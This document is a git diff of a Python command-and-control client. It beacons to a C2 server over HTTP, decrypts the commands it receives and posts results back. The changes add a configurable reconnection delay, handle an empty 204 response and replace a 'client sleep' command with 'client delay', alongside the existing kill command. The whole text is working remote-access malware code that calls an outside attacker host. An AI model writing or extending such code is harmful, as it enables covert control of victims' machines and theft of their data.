@@ -57,16 +57,22 @@ def post_to_server(message: str, response_path=RESPONSE):
     except exceptions.RequestException:
         return
 
+
 """this is a function that split string and returns third item.
 by default, all forwarded slashes in the third item Changed to backslashes
 this can be disabled, if replace set on False during call function. """
+
+
 def get_filename(input_string):
     try:
-        return " ".join(input_string.split()[2:]).replace("\\","/")
+        return " ".join(input_string.split()[2:]).replace("\\", "/")
     # If the path of the file doesn't enter correctly, notify us on the server
     except IndexError:
         post_to_server(f"You must enter Argument after {input_string}. \n")
 
+
+# the delay between re-connection attempts when inactive is set in settings.py
+delay = DELAY
 
 # Better use infinity loop when add control active sessions feature in Server Side
 while True:
@@ -74,7 +80,8 @@ while True:
 	if failed, Keep Trying forever.'''
     try:
         response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
-
+        # print(f"{Fore.LIGHTYELLOW_EX}{client.split("@")[0]}{Fore.MAGENTA} => {Fore.LIGHTBLUE_EX}{response.status_code}{Fore.RESET}")
+        print(client.split("@")[0], "=>", response.status_code, sep=" ")
         # if we got 404 status codes, raise an exception to jump to except block
         if response.status_code == 404:
             raise exceptions.RequestException
@@ -82,7 +89,7 @@ while True:
     except exceptions.RequestException:
         # print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
         try:
-            sleep(DELAY)
+            sleep(delay)
             continue  # jump to the last iteration of the loop(while True:)
         except KeyboardInterrupt:
             print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Client Side" + Fore.RESET)
@@ -94,6 +101,10 @@ while True:
         print(Fore.LIGHTYELLOW_EX + "\n[!] Unknown Error when Sending Request to C2 Server" + Fore.RESET)
         print(f'Error Content: {e}')
         exit()
+
+    # If we get a 204-Status Code from the Server, simply ReIterate the Loop with no sleep
+    if response.status_code == 204:
+        continue
 
     # Retrieve the command from response and decode it 
     command = cipher.decrypt(response.content).decode()
@@ -267,29 +278,22 @@ while True:
     elif command == "client kill":
         post_to_server(f"{client} has been Killed. \n")
         exit()
-    # the client sleep SECOND command will sleep the client for number of seconds
-    elif command.startswith("client sleep"):
-        # Slicing the command to remove the client sleep and the extract delay
+
+    # the 'client delay SECOND' command will Change delay time between Inactive Re-Connection attempts
+    elif command.startswith("client delay"):
         try:
             delay = float(command.split()[2])
             # if delay under zero raise ValueError
             if delay < 0:
                 raise ValueError
-        # Handle ValueError & IndexError Exceptions
         except (IndexError, ValueError):
             post_to_server("You must Enter a Positive Number for Sleep Delay in Seconds.\n")
-
-        # if No Excepts happens, sleep the client for the delay seconds and send a message to the server
         else:
-            post_to_server(f"{client} go to Sleep for {delay} seconds.\n")
-            sleep(delay)
-            # After sleep, client awake and then send a client awake message to the server
-            post_to_server(f"{client} is now Awake.\n")
+            post_to_server(f"{client} is now Configured for a {delay} Seconds delay when set inactive .\n")
 
     else:
         post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
 
     print("[+] Command Executed and Result send to C2 Server.")
-    print(Fore.LIGHTBLUE_EX + str(response.status_code) + Fore.RESET)
 
 print(Fore.LIGHTCYAN_EX + f"[+] Goodbye & Goodluck Ninja 🥷\n{client}" + Fore.RESET)
